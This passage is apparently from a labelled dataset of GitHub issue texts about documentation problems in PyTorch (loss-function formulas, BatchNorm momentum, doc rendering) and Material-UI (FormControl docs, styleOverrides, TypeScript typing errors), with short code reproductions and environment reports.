Environment\r\n\r\nPyTorch version: 1.0.0 (also tested on 0.4.1)\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 16.04.5 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.13.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 8.0.61\r\nGPU models and configuration: GPU 0: GeForce GTX 1050\r\nNvidia driver version: 384.130\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.6.0.21\r\n/usr/lib/x86_64-linux-gnu/libcudnn_static_v6.a\r\n\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nIn BatchNorm2d' doc, the explanation of momentum is:\r\n`\\hat{x}_\\text{new} = (1 - \\text{momentum}) \\times \\hat{x} + \\text{momemtum} \\times x_t$`\r\n\r\nwhere `x_t` is the newly computed batch statistics, `\\hat{x}` is the estimated statistics in history.\r\nWhile in my experiments, when momentum set to 0, the batchnorm operates just use the newly computed statistics.\r\n\r\nSo I guess maybe the following explanation is correct:\r\n\r\n`\\hat{x}_\\text{new} = \\text{momemtum\\times \\hat{x} + (1 - \\text{momentum}) \\times x_t$`\r\n\r\n## To Reproduce\r\n\r\n`b_x` is a torch.Tensor with shape (8, 3, 299, 299), which read from an image\r\n`mol` is the model load from `Inception V3`\r\nI have set the momentum as 0 in [Inception v3 model struct](https://github.com/pytorch/vision/blob/master/torchvision/models/inception.py):\r\n\r\n```python\r\nclass BasicConv2d(nn.Module):\r\n\r\n    def __init__(self, in_channels, out_channels, **kwargs):\r\n        super(BasicConv2d, self).__init__()\r\n        self.conv = nn.Conv2d(in_channels, out_channels, bias=False, **kwargs)\r\n        self.bn = nn.BatchNorm2d(out_channels, eps=0.001, momentum=0)\r\n\r\n    def forward(self, x):\r\n        x = self.conv(x)\r\n        x = self.bn(x)\r\n        return F.relu(x, inplace=True)\r\n```\r\n\r\nThen I calculate the mean and var:\r\n``` python\r\nconv = mol.Conv2d_1a_3x3.conv(b_x)\r\ndim = conv.shape\r\nm = (conv.sum(0).sum(1).sum(1)/(dim[0]*dim[2]*dim[3])).view(1, -1, 1, 1)\r\nvar = (((conv-m)**2).sum(0).sum(1).sum(1)/(dim[0]*dim[2]*dim[3]-1)).view(1, -1, 1, 1) + 0.001\r\ntmp = (conv - m) / torch.sqrt(var)\r\ntmp = tmp * mol.Conv2d_1a_3x3.bn.weight.view(1, -1, 1, 1) + mol.Conv2d_1a_3x3.bn.bias.view(1, -1, 1, 1)\r\nbn = mol.Conv2d_1a_3x3.bn(conv)\r\nprint((bn-tmp).mean(), (bn-tmp).std())\r\n```\r\n\r\nThe result is that `bn=tmp` while `momentum = 0`\r\n\r\n## Expected behavior\r\n\r\nExpected `bn=tmp` while `momentum = 1`\r\n\r\n## Environment\r\n\r\n - PyTorch Version 0.4.1:\r\n - Windows:\r\n - pip:\r\n - Python version: 3.6.5\r\n"},{"labels":[null,"documentation"],"text":"The cross entropy loss requires a linear output layer with no softmax activation function.\r\nHowever, the documentation isn't specifying this in a clear way IMHO.\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/loss.py#L824\r\nShould it be rephrased to something like:\r\n    ```The `input` is expected to contain scores for each class. Don't normalize these scores into probabilities.```"},{"labels":["documentation",null],"text":"pytorch 1.0\r\n-------------\r\nDOC:This is used for measuring the error of a reconstruction in for example an auto-encoder. Note that the targets y should be numbers between 0 and 1.\r\n--------------\r\nimport torch \r\nimport torch.nn.functional as F\r\nb=[[0.2,0.1]]\r\nc=[[1.,3.]]\r\naa = torch.tensor(b,requires_grad=True)\r\ntarget = torch.tensor(c)\r\noutput = F.binary_cross_entropy(aa,target,reduce=True,size_average=True)\r\nz=output.sum()\r\nz.backward()\r\nprint(output)\r\n-----------------------\r\ntensor(4.1532, grad_fn=<BinaryCrossEntropyBackward>)\r\n---------------\r\ntarget value is 1 and 3.,not between 0 and 1.\r\n"},{"labels":["documentation",null],"text":"pytorch 1.0\r\nDOC err:torch.nn.CrossEntropyLoss\r\nif weight=NONE\r\nloss(x,class)=−x[class]+log(j∑​exp(x[j])) ,The result is correct.\r\n\r\nif weight!=NONE\r\nloss(x,class)=weight[class]*(−x[class]+log(j∑​exp(x[j]))) ,The result is wrong?\r\n-----------------------\r\nimport torch\r\nimport torch.nn.functional as F\r\na=[[-5.,-6.],[3.,2.],[3.,2.]]\r\nc=[1,0,1]\r\nb=[3.,2.]\r\ninput=torch.tensor(a,requires_grad=True)\r\ntarget = torch.tensor(c)\r\nweight = torch.tensor(b)\r\noutput = F.cross_entropy(input,target,weight,reduce=True,size_average=True)\r\nz=output.sum()\r\nz.backward()\r\nprint(output,input.grad)\r\n------------------------------\r\ntensor(0.8847, grad_fn=) tensor([[ 0.2089, -0.2089],\r\n[-0.1153, 0.1153],\r\n[ 0.2089, -0.2089]])\r\n------------------\r\n\r\n"},{"labels":["documentation",null],"text":"How does this function calculate grad:torch.nn.functional.cross_entropy \r\nfor example :out= input[i][target[i]], i=0to N-1,dout/dinput=?\r\nCan you attach the derivative formula to the document?"},{"labels":["documentation"],"text":"The tutorial at: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html#gradients\r\n![image](https://user-images.githubusercontent.com/1032377/49982017-a95cb500-ff28-11e8-9465-7b0da9ce39c4.png)\r\n"},{"labels":["documentation"],"text":"there's still a page on it: https://pytorch.org/docs/master/ffi.html?highlight=ffi"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\ntorch.legacy can still be found in docs, and also on the README page.\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/distributions.html#relaxedonehotcategorical\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/49818771-96d45700-fd41-11e8-97cd-8d87f4a5fd8d.png)\r\n"},{"labels":["documentation",null],"text":"They should have a test case, test plan, etc..."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nWith the new 1.0 documentation up, the formulas in note for torch.optim.SGD isn't being rendered:\r\n![image](https://user-images.githubusercontent.com/3891274/49739907-b022c800-fc9b-11e8-9863-dc42c8e11506.png)\r\n\r\nFormulas in other places, e.g., torch.nn, appear fine."},{"labels":[null,"documentation"],"text":"## 🐛 Bug\r\n\r\nThe CONTRIBUTING.md file documents a command (`python setup.py rebuild_libtorch`) for re-building only the PyTorch C++ code, but it does not exist.\r\n\r\nThe command is documented here: https://github.com/pytorch/pytorch/blob/master/CONTRIBUTING.md#build-only-what-you-need\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Build PyTorch from source in development mode using `python setup.py build develop`.\r\n1. Run `python setup.py rebuild_libtorch`\r\n\r\n```\r\n$ python setup.py rebuild_libtorch\r\nBuilding wheel torch-1.0.0a0\r\nusage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...]\r\n   or: setup.py --help [cmd1 cmd2 ...]\r\n   or: setup.py --help-commands\r\n   or: setup.py cmd --help\r\n\r\nerror: invalid command 'rebuild_libtorch'\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe command should exist, or the documentation in CONTRIBUTING.md should be updated.\r\n\r\nI'm using this command as a workaround:\r\n\r\n```\r\n$ ninja -C build libtorch_python.so\r\n```\r\n\r\n## Environment\r\n\r\n(I'm building this inside of a Docker container.)\r\n\r\nPyTorch version: 1.0.0a0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Ubuntu 18.04.1 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy (1.15.4)\r\n[pip] torch (1.0.0a0, /app/pytorch)\r\n[conda] Could not collect\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the docs, a keyword parameter with default value of zero looks like a lowercase letter o. For example in [torch.util.data](https://pytorch.org/docs/stable/data.html#torch.utils.data.DataLoader), this is what the definition for dataloader looks like for me.\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699847-57392e00-fbce-11e8-810b-0622ff8966b1.png)\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699860-8bacea00-fbce-11e8-8dcd-4b84a0416350.png)\r\n\r\nZero looks fine in the docs for parameters themselves.\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699870-a1baaa80-fbce-11e8-97f4-5402addffbce.png)\r\n\r\nPart of the issue is that numbers are smaller than usual."},{"labels":["documentation",null],"text":"C10 seems to have an increasingly important role throughout the PyTorch code base (e.g., see #6325 or count the number of open issues containing \"c10\") yet I was unable to find a high-level description about it. There are only \"rumors\" to be found about C10, see for example [this post](https://discuss.pytorch.org/t/pytorch-and-caffe2-convergence/21713/4) at pytorch.org:\r\n> I read on github, that there is a new backend called C10 in progress which combines features and backends from ATen and Caffe2. This backend should be a more generic one which means that adding new tensor types and similar stuff will be easier (the actual discussion was about introducing complex tensors).\r\n\r\nSomeone else on [Reddit](https://www.reddit.com/r/MachineLearning/comments/8xurkp/n_tensorflow_190_is_out/e27ewhz/):\r\n> I'd never heard of C10 until you posted this, so caveat emptor, but from the few Google hits available it seems that the major motivations for C10 include:\r\n>\r\n> * Common Tensor ops for PyTorch and Caffe2 (only PyTorch uses ATen)\r\n> * Pluggable tensor ops/backend (maybe easing future AMD, TPU, etc support?)\r\n>\r\n> There's also talk of C10 helping integration of Complex tensor support for PyTorch, which helps give an idea of the level of abstraction they are shooting for.\r\n\r\nAt the minimum, please add a README to the pytorch/c10 directory briefly describing the project."},{"labels":["documentation",null],"text":"## 🐛 Bug\r\nWhen I copied a tensor to part of another tensor, I found a problem when the tensor copied to is indexed by numpy array.\r\nI'm using Pytorch 0.4.1. It is installed by pip, and I'm using Mac OS High Sierra.\r\n Below is an example, which can be reproduced easily in python environment.\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n`a = torch.zeros((2,2,1))`\r\n`x = torch.ones((1,1))`\r\n`indices = np.array([0,1])`\r\n`a[0,indices].copy_(x)`\r\nAfter this, printing out 'a' will still give a tensor full of zeros.\r\n\r\nI also found that the same problem occured when indices are list. Below is another reproduction of the problem.\r\n`a = torch.zeros((2,2,1))`\r\n`x = torch.ones((1,1))`\r\n`indices = [0,1]`\r\n`a[0,indices].copy_(x)`"},{"labels":[null,null,"documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\n`torch.onnx.export` shows no documentation on the docs [page](https://pytorch.org/docs/master/onnx.html#functions), while it has documentation in the [source](https://github.com/pytorch/pytorch/blob/master/torch/onnx/utils.py). It would be useful to have the documentation on the docs page.\r\n"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nLong pages in the documentation such as the [documentation for the torch.nn module](https://pytorch.org/docs/master/nn.html) take a long time to render and become interactive. On my system in the page is unresponsive for several seconds while opening this page, which makes navigating around the documentation a bit painful.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Go to the [torch.nn](https://pytorch.org/docs/master/nn.html) docs page in Chrome, Safari or Firefox\r\n1. Try to scroll or interact with the page (eg. to go to docs for a specific class from the table of contents) a few seconds after load\r\n\r\nA Chrome trace shows the time is split between layout and scripting. A significant chunk of the scripting time is spent in KaTeX math rendering.\r\n\r\n<img width=\"314\" alt=\"chrome performance summary\" src=\"https://user-images.githubusercontent.com/2458/49345714-ad631a00-f680-11e8-9811-58a0ea0d886b.png\">\r\n\r\n## Expected behavior\r\n\r\nIdeally the page would be small enough that browsers can load it without becoming unresponsive for a significant amount of time.\r\n\r\n## Environment\r\n\r\nTested with Chrome 72 and Safari 12.0 on a late 2016 13\" MBP.\r\n\r\nMy knowledge of Sphinx is limited, but perhaps it would make sense to split up the documentation for some of the largest modules into a summary page listing the classes/methods/functions with brief descriptions and a details page with the full docs, eg. using [sphinx.ext.autosummary](http://www.sphinx-doc.org/en/master/usage/extensions/autosummary.html)?\r\n\r\nIt probably would be possible to optimize the math rendering step without changing the structure, but as long as the page has as many DOM elements as this one, everything is likely to be sluggish."},{"labels":["documentation"],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/torch.html?highlight=full#torch.full_like :\r\n\r\n```Returns a tensor with the same size as input filled with fill_value. torch.full_like(input, fill_value) is equivalent to torch.full_like(input.size(), fill_value, dtype=input.dtype, layout=input.layout, device=input.device).```\r\n\r\nShould it not be `equivalent to torch.full(...`?"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\nThere are no code examples for `torch.nn.AdaptiveLogSoftmaxWithLoss`, and so it is not trivial how to go about using it as a layer, and how to use the methods `predict` and `log_prob`.\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"For the record it is ms but I have to sit down and ask myself this once every few weeks.\r\nhttps://pytorch.org/docs/master/cuda.html?highlight=cuda%20event#torch.cuda.Event"},{"labels":["documentation"],"text":"Standalone documentation browsing apps like [Dash](https://kapeli.com/dash), [Zeal](https://zealdocs.org/), and [Velocity](https://velocity.silverlakesoftware.com/) use a documentation packaging format called [docset](https://kapeli.com/docsets)\r\n\r\nThe excellent Material UI docs would be even nicer if they were published in the `docset` format, available for local+offline search and perusal.\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nExisting docs should be published and made available on the [Kapeli/Dash-User-Contributions](https://github.com/Kapeli/Dash-User-Contributions) repository."},{"labels":[null,"documentation",null],"text":"Outlined or Filled selects do not render correctly when displayEmpty is set to true. The label overlaps the 'None' value.\r\n\r\nhttps://codesandbox.io/s/material-demo-forked-kg8p2?file=/demo.tsx\r\n\r\n![2020-09-14 19_08_41-Material demo - CodeSandbox](https://user-images.githubusercontent.com/3032687/93110608-3b758c80-f6be-11ea-8988-7127cd805570.png)\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nThe documentation for FormControl explicitly states: `Only one input can be used within a FormControl.`\r\nThe demo of checkboxes on the Checkbox documentation page shows a FormControl containing three Checkbox components.\r\n\r\nSo, which one is correct?\r\n \r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nThere are at least two related bugs that were closed:\r\n\r\nThis issue, [Update Selection Controls Radio/Checkbox group demo](https://github.com/mui-org/material-ui/issues/13784), suggests that the demos for checkbox and radio button group be modified to not put multiple inputs inside a FormControl. Closed as not a bug, with comments that seem to indicate multiple text fields are a problem, but multiple checkboxes are okay.\r\n\r\n[[FormControl] Maximum update depth exceeded](https://github.com/mui-org/material-ui/issues/12197). Closed with comment `You can only use a single input within a FormControl.` \r\n\r\n## Current Behavior 😯\r\n\r\nThe example in the Checkbox documentation contradicts the documented API, by placing 3 checkboxes inside one FormControl\r\n\r\n## Expected Behavior 🤔\r\n\r\nPossible fix 1:\r\nThe FormControl does not contain the text `Only one input can be used within a FormControl.` If there are cases where it's okay to use multiple inputs, and other cases where it doesn't work, the FormControl documents those. Seems like it may be okay to use multiple inputs but not multiple **text** inputs.\r\n\r\nOr, option 2:\r\nThe Checkbox and Radio Button documentation sections do not show, in their demo code, examples of multiple inputs being used inside a FormControl.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Visit the docs page for FormControl. https://material-ui.com/api/form-control/ Note the text, with an adjacent yellow Warning icon, `⚠️Only one input can be used within a FormControl.`\r\n2. Visit the docs page for Checkbox, and scroll to the section \"Checkboxes with FormGroup.\" https://material-ui.com/components/checkboxes/#checkboxes-with-formgroup\r\n3. Click the <> button to show the source.\r\n4. Scroll down in the source code to see the usage of `FormControl`. Note that inside each FormControl is a FormGroup containing three Checkbox inputs.\r\n\r\n## Context 🔦\r\nI'm trying to figure out how FormControl fits in with Material-UI forms components. I'm confused by the conflicting docs.\r\n\r\n## Your Environment 🌎\r\nn/a - docs"},{"labels":[null,"documentation",null,null],"text":"In my application, I was rendering two different material-tables in two different steps of the Stepper component. When trying to test switching between steps quickly it would begin slowing down considerably and eventually freeze (in which I had to close the browser tab to continue). \r\n\r\nI'm not sure the process for contributing code so I'm attaching below how I went around this by instead setting `display: none;` on all non-active steps. \r\n\r\n```tsx\r\ninterface StepContentProps {\r\n\tcomponent: any;\r\n\tprops?: any;\r\n}\r\n\r\ninterface ContentProps {\r\n\tstepContent: StepContentProps[];\r\n\tactiveStep: number;\r\n}\r\n\r\nconst StepContent = ({ stepContent, activeStep }: ContentProps) => {\r\n\treturn (\r\n\t\t<>\r\n\t\t\t{stepContent.map(({ component: Component, props }, index) => {\r\n\t\t\t\treturn (\r\n\t\t\t\t\t<Component key={index} style={{ display: activeStep === index ? 'inherit' : 'none' }} {...props} />\r\n\t\t\t\t);\r\n\t\t\t})}\r\n\t\t</>\r\n\t);\r\n};\r\n```\r\n\r\nHere's an example of what the array of StepContentProps looks like:\r\n\r\n```ts\r\nconst stepContent: StepContentProps[] = [\r\n\t\t{\r\n\t\t\tcomponent: MaterialTable,\r\n\t\t\tprops: {\r\n\t\t\t\ttitle: 'Users',\r\n\t\t\t\tcolumns: userColumns as Column<User | Inventory>[],\r\n\t\t\t\tdata: users,\r\n\t\t\t\toptions: { selection: true, filtering: true, tableLayout: 'auto' },\r\n\t\t\t\tonSelectionChange: (rows) => {\r\n\t\t\t\t\tsetSelectedUsers(rows);\r\n\t\t\t\t},\r\n\t\t\t} as MaterialTableProps<User>,\r\n\t\t}\r\n]\r\n```"},{"labels":[null,"documentation"],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nInstead of recommending to use named exports, how about recommending importing all modules?\r\n- it [won't increase the bundles](https://github.com/webpack/webpack/tree/master/examples/harmony-unused#examplejs) and is not worse in terms of initial parsing for development workflow than named imports\r\n\r\n## Examples 🌈\r\n\r\nBefore:\r\n```ts\r\nimport { Button, Table, ... } from \"@material-ui/core\"\r\n```\r\n\r\nAfter:\r\n```ts\r\nimport * as Mui from \"@material-ui/core\"\r\n```\r\n\r\n## Motivation 🔦\r\n\r\n**Pros**:\r\n- improves consistency\r\n  - because a similar decision was [made here](https://github.com/mui-org/material-ui/pull/19802)\r\n    - `material-ui` doesn't import named exports from `react`, why should imports from `material-ui` be different?\r\n- improves DX\r\n  - as it removes the need to manually clean up unused imports (when there is a linter rule in development workflow).\r\n  - as it removes the need to manually add new imports from `Mui`\r\n    - as IDEs most of the time fail to auto import from libraries already present in the module\r\n  - as it is cleaner, since less individual imports are in the module\r\n    - it is easier to understand where the variable is coming from while looking at the code, as you know the variable in question belongs to `Mui`\r\n      - for example: `Mui.Button` is a **pure** `Mui` button, whereas `Button` is part of your project's modifications that fell outside of what you can do with theme's customizations\r\n- it's better marketing for `material-ui` and useful for beginners, as developers are reminded on what they use as they use values from `Mui.`\r\n\r\n**Cons**:\r\n- the amount of code writing (less lines, but a bit more actual text) is more as there'd be a prefix everywhere: `Mui.` \r\n  - but **the clear indication** where these variables are coming from is far more important\r\n\r\n### Example project\r\n\r\nFor your convenience I created a simple example that showcases:\r\n- tree-shaking of `material-ui` works when importing all\r\n\r\nBasically I put @oliviertassinari [example function](https://github.com/mui-org/material-ui/issues/22529#issuecomment-689103337) into a [new CRA project](https://github.com/o-alexandrov/mui-import-all-treeshaking/commits/master). Please follow commits as it's easier to understand what has been changed in a pure CRA project.\r\n\r\nAnd here is a screenshot of the [webpack-bundle-analyzer](https://github.com/webpack-contrib/webpack-bundle-analyzer). We can clearly see that only the button and what's necessary for it is imported (to see it for yourself, run `yarn build`):\r\n<img width=\"1792\" alt=\"Screen Shot 2020-09-08 at 4 21 39 PM\" src=\"https://user-images.githubusercontent.com/9992724/92529460-29907700-f1f0-11ea-9d74-e8844967e96c.png\">"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nBring \"inline previews\" for as many demos as possible.\r\n\r\n## Examples 🌈\r\n\r\n<img width=\"792\" alt=\"Capture d’écran 2020-09-04 à 16 12 19\" src=\"https://user-images.githubusercontent.com/3165635/92248759-6e9f6b00-eec9-11ea-8c45-13bbfba83067.png\">\r\n\r\nhttps://next.material-ui.com/components/buttons/#contained-buttons\r\n\r\n## Motivation 🔦\r\n\r\nInline previews were introduced in #17831 by @mbrookes. We have done a couple of iteration it increases their usage in the codebase. However, I believe we have never pushed it to its full potential. For instance: https://next.material-ui.com/components/accordion/.\r\n\r\nThis would match with the answers of the survey: [`docs - smaller demos`](https://material-ui.com/blog/2020-developer-survey-results/#5-how-can-we-improve-material-ui-for-you).\r\n\r\n## Benchmark\r\n\r\n- https://sancho-ui.com/components/breadcrumb/ Note that being able to edit the demos directly is even simpler than opening in CodeSandbox."},{"labels":["documentation"],"text":"Summary:\r\nOn the example site under customization -> globals the example show use the overrides keyword but this has been changed to styleOverrides in the newest alpha build.\r\n\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe example show this:\r\n```javascript\r\nconst theme = createMuiTheme({\r\n  components: {\r\n    // Style sheet name ⚛️\r\n    MuiButton: {\r\n      overrides: {\r\n        // Name of the rule\r\n        textPrimary: {\r\n          // Some CSS\r\n          color: 'white',\r\n        },\r\n      },\r\n    },\r\n  },\r\n});\r\n```\r\nThis will give you a typeScript error e.g. 'overrides does not exist in type'\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nThe example should use styleOverrides instead: \r\n\r\nThe example show this:\r\n```javascript\r\nconst theme = createMuiTheme({\r\n  components: {\r\n    // Style sheet name ⚛️\r\n    MuiButton: {\r\n      styleOverrides: {\r\n        // Name of the rule\r\n        textPrimary: {\r\n          // Some CSS\r\n          color: 'white',\r\n        },\r\n      },\r\n    },\r\n  },\r\n});\r\n```\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. [Go to the Alpha docs -> customization/globals](https://next--material-ui.netlify.app/customization/globals/)\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI just think that this can be good to fix before the real release of V5\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v5.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nI am trying to follow along with https://material-ui.com/components/buttons/#third-party-routing-library and leveraging [the nextjs-with-typescript example](https://github.com/mui-org/material-ui/tree/master/examples/nextjs-with-typescript) from material-ui.  It appears that in some cases TypeScript has issues with certain combinations of properties.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n  - It feels very similair to https://github.com/mui-org/material-ui/issues/16846 but that issue has been closed...\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nI've made two changes from https://github.com/mui-org/material-ui/tree/master/examples/nextjs-with-typescript to demonstrate the expected behavior and the bug.  \r\n\r\n- In `pages/about.tsx`, on lines 17-19, I've replaced the Link component with a Button using the `component={Link}` prop as mentioned in the [third-party-routing-library](https://material-ui.com/components/buttons/#third-party-routing-library) guide. I have also added a `variant=\"outlined\"` prop to style the button, which causes TypeScript to throw this error:\r\n```\r\nNo overload matches this call.\r\n  Overload 1 of 3, '(props: { href: string; } & { children?: ReactNode; color?: \"inherit\" | \"default\" | \"primary\" | \"secondary\" | undefined; disabled?: boolean | undefined; disableElevation?: boolean | undefined; ... 6 more ...; variant?: \"text\" | ... 2 more ... | undefined; } & { ...; } & CommonProps<...> & Pick<...>): Element', gave the following error.\r\n    Type '{ children: string; component: ForwardRefExoticComponent<Pick<LinkProps, \"slot\" | \"style\" | \"title\" | \"className\" | \"classes\" | \"innerRef\" | \"key\" | \"defaultChecked\" | \"defaultValue\" | \"suppressContentEditableWarning\" | ... 272 more ... | \"prefetch\"> & RefAttributes<...>>; href: string; variant: \"outlined\"; }' is not assignable to type 'IntrinsicAttributes & { href: string; } & { children?: ReactNode; color?: \"inherit\" | \"default\" | \"primary\" | \"secondary\" | undefined; disabled?: boolean | undefined; ... 7 more ...; variant?: \"text\" | ... 2 more ... | undefined; } & { ...; } & CommonProps<...> & Pick<...>'.\r\n      Property 'component' does not exist on type 'IntrinsicAttributes & { href: string; } & { children?: ReactNode; color?: \"inherit\" | \"default\" | \"primary\" | \"secondary\" | undefined; disabled?: boolean | undefined; ... 7 more ...; variant?: \"text\" | ... 2 more ... | undefined; } & { ...; } & CommonProps<...> & Pick<...>'.\r\n  Overload 2 of 3, '(props: { component: ForwardRefExoticComponent<Pick<LinkProps, \"slot\" | \"style\" | \"title\" | \"className\" | \"classes\" | \"innerRef\" | \"key\" | \"defaultChecked\" | \"defaultValue\" | \"suppressContentEditableWarning\" | ... 272 more ... | \"prefetch\"> & RefAttributes<...>>; } & { ...; } & { ...; } 